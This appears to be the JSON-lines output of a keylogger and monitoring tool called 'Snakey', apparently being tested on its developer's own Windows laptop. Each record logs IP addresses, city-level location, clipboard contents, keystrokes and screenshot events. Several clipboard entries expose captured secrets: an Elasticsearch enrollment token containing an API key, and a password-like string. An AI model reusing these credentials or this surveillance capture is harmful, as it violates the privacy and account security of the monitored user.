{"timestamp": "2025-06-05T10:50:58.558401", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ee3643c23c8fb86bf2bcb9fcf8ce224e50ac1aa8f46bade9cd8a9cc93fe97bf0", "log_hash": "a0c285668f68fa7418ee9a70770bb4e796db020050ea69b0a139a1122b0b78bd"}
{"timestamp": "2025-06-05T10:51:25.148240", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f5c494e76ff602475f19ea30f6cedd2e1ea4dd4e0827b9a57378431fe888bb1f", "log_hash": "a0bc190b1e0f3ff2788af1b794c6ef16aae06f767d979b9a519ed044d87d947a"}
{"timestamp": "2025-06-06T11:17:52.056536", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (778 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "dd9ecee6de151d22619d8e56e347f4b83bd81236b4b09d6983c01d176b9b6dac", "log_hash": "19fbd01a33396b98ba01908845cbe9ab21cf7fc76367e518ef3c58461fe0fadd"}
{"timestamp": "2025-06-06T11:18:18.674590", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (778 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "0fa0662ff9240167eb5ba1e707ad87121bfeee85e8fbca133e610f0159d7846f", "log_hash": "e4131bc3130987547f04af1dda83620a61caa9a1f6b600046cc3c9a8b95e0a6b"}
{"timestamp": "2025-06-06T11:18:45.352238", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (778 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "499de23da68eed21a2bd5f88e14a5e30af00cf6f093b5296e094e87ea21b5f48", "log_hash": "35756201ec8bfc986fb84e9fd86b953e04c0cca95f73d11ed0134d59b4cd9fc5"}
{"timestamp": "2025-06-06T11:19:12.208643", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (778 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "18b9c6323bfe17773a3d6e346e13b61b33121d7a3c38e58f4dced3066da18b12", "log_hash": "c5f9a82c5a623dea7dd202575ddee7d555d3f149bde3e2319d01fe9b24877db7"}
{"timestamp": "2025-06-06T11:19:38.552472", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "y", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (778 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bf815e28c9cb3337b171287233c4b5d3fae611d9302f8ed88bfafa680422c187", "log_hash": "054ccddae3ee97e2f9f9402f09865df9dd1a41e1f7289f23122a5bdc5d8279de"}
{"timestamp": "2025-06-07T11:01:26.150997", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (779 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "cc75431ce5b27fffc69a7d600586637c3e1defb44a371af02bf2f5fe10b5ec53", "log_hash": "951e6622f837362d514403d8b0a64174b3466277c67e057acd9b7f6cb7b67aa4"}
{"timestamp": "2025-06-07T18:43:52.403495", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "NameError                                 Traceback (most recent call last)\r\nCell In[1], line 16\r\n     10 features = ['month', 'day', 'hour', 'weekday', 'distance', 'air_time']\r\n     11 # Para incluir 'carrier', 'origin', 'dest', precisamos de as converter para num\u00e9rico (Label Encoding ou One-Hot Encoding)\r\n     12 # Label Encoding \u00e9 mais simples para Decision Trees, mas assume uma ordem que pode n\u00e3o existir.\r\n     13 # Para este exemplo simb\u00f3lico, vamos come\u00e7ar com Label Encoding.\r\n     14 \r\n     15 # Criar uma c\u00f3pia para n\u00e3o modificar o DataFrame original\r\n---> 16 df_model = df_flights.copy()\r\n     18 # Aplica\u00e7\u00e3o de Label Encoding para colunas categ\u00f3ricas\r\n     19 le = LabelEncoder()\r\n\r\nNameError: name 'df_flights' is not defined", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (786 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "e79e2603e1b9cadf15431ec67c95214676d9c6a63f7cf61fc8717b6ec3a596e3", "screenshot_hash": "cc5e053ad6d61f3a7b5e690df6589f7fc7062ce37c50d65f7be4740ca42ab339", "log_hash": "2110821a7eee2c65910e066dd45f64d40ad644e52ec001b5eb9ad32973f9997e"}
{"timestamp": "2025-06-09T10:30:14.453214", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "7afbf2ba1304445a965a7ef04ed31ca841a564364e36045977c17bb87a855312", "log_hash": "b0d6044ba39da494a1d35be010e5a6640c93a0c2c33544d7fb3c1adac88fb54e"}
{"timestamp": "2025-06-09T10:30:41.439121", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "696b76cc1cab518282fc6b9c84915e7f701b91939187bf0b761488e8c669f58e", "log_hash": "d21519d6cbcf3c2ffe83fdef6db84d75e440d892b7469a3d343c03c245ebf476"}
{"timestamp": "2025-06-09T10:31:07.518942", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e76ff46054273e418306c28b85f54ff50264994b9fd6d81d61b2b9a9151e4b8e", "log_hash": "cb0f03c0bad717f2eea864430744acacaee63a46b64fed1cb6f6954dfe3317f6"}
{"timestamp": "2025-06-09T10:31:34.178009", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "53a1696cfbb178a34d8f1bf7ce044d9f41c19157f039ed261c4f28d7cb484944", "log_hash": "d07aa7a3ecbc4724d7facc7606f1a41f070b1750748058091ab1156f8a6d568a"}
{"timestamp": "2025-06-10T13:43:20.410448", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "06b5db43a0fb13039243e6a5e6ecf47c2e6ede7edc116ef3d959eb31120e71ff", "log_hash": "d985a63a5091086cdd8797de4364f5d7dd416b24d8330eee1966637e7160813a"}
{"timestamp": "2025-06-10T13:43:46.914341", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9e3e8e80460fbfdfb21f12dc725ffd94c8d65baccc973e946954b9b4796681b9", "log_hash": "30d9b21845a8b626ddb3124f253b56c76051dcf1f3ef086427378a86bc8c00f7"}
{"timestamp": "2025-06-10T13:44:14.235057", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snak", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (788 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "1b0bac029f3feb0542316124ea20aa0883da2505638aa7db35779a9f889bdb8c", "log_hash": "f3541f923622f29895d8ff56e0c7cdce53e7c4c98e2f185abf081877ed00141f"}
{"timestamp": "2025-06-10T15:23:35.812772", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "elasticsearch==8.14.0", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f27e60f87d24acefe5ec1a9c5d3c1f692bb300c88208d6c4aedcc17c7f0ddcd5", "screenshot_hash": "801eaf420f512c35defa8623228b53462f67526dcb6f3698fbe13b55c38c4a50", "log_hash": "2c9931263209d8a776248922930534f5210a9599f98c0b23b1171dae6653e726"}
{"timestamp": "2025-06-10T15:24:09.744209", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "[WARNING] N\u00e3o foi poss\u00edvel conectar ao Elasticsearch. Verifique se est\u00e1 a correr e as credenciais.\r\n[INFO] Starting Snakey in daemon mode...\r\n[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\r\n[SUCCESS] Log saved to JSON file.\r\n[SUCCESS] Blockchain-style hash ledger updated.\r\n[SUCCESS] Merkle root saved.\r\n[INFO] Log written to Wazuh-compatible file.\r\n[WARNING] Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "5226eb5e432244c02ebe872ec8aeb0f7515a9bd4c9d75c275a40349c9b4fd4e2", "screenshot_hash": "23ae2a7ade03d629040d86b397494705a3322e4ec1dd6ab197476cb9c4f9aff5", "log_hash": "613e682c10da44fb5b34b4ffec24cef144ac99478ebfbd6621b7ef43a59d3fff"}
{"timestamp": "2025-06-10T15:33:21.945997", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "9.0.2", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "db66e3af23c516e1c8fb65c65efaff2e346761f99121c8d3db1dd009d3d406e4", "screenshot_hash": "c8d8ea3bc080acdb84b2fcb49aa84f7095dddcedd88be8684a74284ff9e5d26e", "log_hash": "7d6211b3af0376d655bdbeb6478b7d3bc48ee1b81a941b65764c056b31c7382e"}
{"timestamp": "2025-06-10T15:33:52.509881", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "9.0.2", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "db66e3af23c516e1c8fb65c65efaff2e346761f99121c8d3db1dd009d3d406e4", "screenshot_hash": "adad0d1642836865142fb31159fd1742dbba19b06f104f352c75b19ffe22f520", "log_hash": "80d0dfaa6e69cf07d2ecc29e4a2d2f2dfa98669f1a209b85e32804645ea0dd65"}
{"timestamp": "2025-06-10T15:37:21.988310", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "eyJ2ZXIiOiI4LjE0LjAiLCJhZHIiOlsiMTcyLjIwLjEwLjI6OTIwMCJdLCJmZ3IiOiIwZDQ4ODhiMjlkYWQzNzAxODAxZWI5ZjFkMGQ2ZGU3ODljMWE2NzRjMmRjMzU2NjlkNmFjYmVhZGFjYTdlNWExIiwia2V5IjoiejZENFdaY0JZT2txcnozazcwLWk6emxUMXFCMDRfODJuVk1ENEVBbGxoQSJ9\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "3f48e52cd6f0b10f2b2df49aee6f37050f6508df40e122d8554a4250029482b1", "screenshot_hash": "52bf447d0984f2ee6ccd1078a06bba8089cfac0e7a291abd6ca73099dc58b34f", "log_hash": "83892c230d8b9025afb42328c7a719726fa0d730e5c211cecbc38d363175b965"}
{"timestamp": "2025-06-10T16:05:15.743774", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "b0d72418722894ebdafc24eca373974990209a113060c7ece903a2fe9139849e", "log_hash": "bb2cee819d72a9da0a342ce7afecd518a89ccfec37f93c70a7710aefcb32df98"}
{"timestamp": "2025-06-10T16:05:44.737384", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "7e28f6b8b08a50565a428ea32d71684e44b2277ca0dc819d5e95c3cf3d31ec7b", "log_hash": "b84713ba6ce0221bc8e5d563a9a0b511c4577200db24df087a919b0d663ea85d"}
{"timestamp": "2025-06-10T16:06:14.377839", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "0a481f4295a171d8ea5a3ddabd1c32f24050820186c62664be36e6d0759b930e", "log_hash": "cfd2f0b89f8309d4beccfe31e1130f9985966f371eabb5d68e3f9bf749971df0"}
{"timestamp": "2025-06-10T16:06:45.831285", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "stop_sna", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "a099d2c374f084658f692d37ecf4a7078ccbac1626e2a4ceb4afe0699497e8e4", "log_hash": "770d9fef99ae8a7aab08323db6e7261ee536c7c6885805402cbb149ac0b2a078"}
{"timestamp": "2025-06-10T16:12:07.406164", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "e784ede0ff8e302e15d89dfe888540851a805b4a484b9efa71f4546ed469ada5", "log_hash": "e68f9075af4467a944dd82ef6c8e1f36959c931b156ded35a0ea93ffe5f3c30d"}
{"timestamp": "2025-06-10T16:12:38.813238", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "64a3ee54b48415a6a8d920cb68d01d74cca9e99901dd36607bd244284e5be10a", "log_hash": "8c782440bc3ac3ca246581e62a180c9ffe6dd5cb46662953cd359c00d04ecb47"}
